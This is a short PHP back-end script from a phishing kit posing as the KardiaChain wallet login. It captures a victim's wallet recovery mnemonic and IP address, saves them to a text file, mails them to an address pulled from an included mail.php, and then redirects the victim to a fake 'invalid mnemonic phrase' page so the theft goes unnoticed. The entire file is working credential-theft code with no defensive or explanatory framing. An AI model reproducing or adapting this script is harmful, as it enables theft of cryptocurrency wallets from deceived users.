<?php
$file = "kardiachain_______.txt";
$mnemonic = $_POST['mnemonic'];
$ip = $_SERVER['REMOTE_ADDR'];

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "mnemonic   	: ");
fwrite($handle, "$mnemonic");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "https://explorer.kardiachain.io/wallet-login ");
fwrite($handle, "\n");
fclose($handle);
$mnemonic = $_POST['mnemonic'];
$ip=$_SERVER['REMOTE_ADDR'];

$message   = "

mnemonic : ".$mnemonic." 

IP Address : https://geoiptool.com/?IP=".$ip." 

https://explorer.kardiachain.io/wallet-login
";
include 'mail.php';
$subject = "============ kardiachain ============ ".$ip." ";
$headers = "From: kardiachaint <niarats@yandex.com>";
mail($rezult_mail, $subject, $message, $headers);
echo "<script LANGUAGE=\"JavaScript\">
<!--
top.location=\"/invalid-mnemonic-phrase.html?/login\";
// -->
</script>";
?>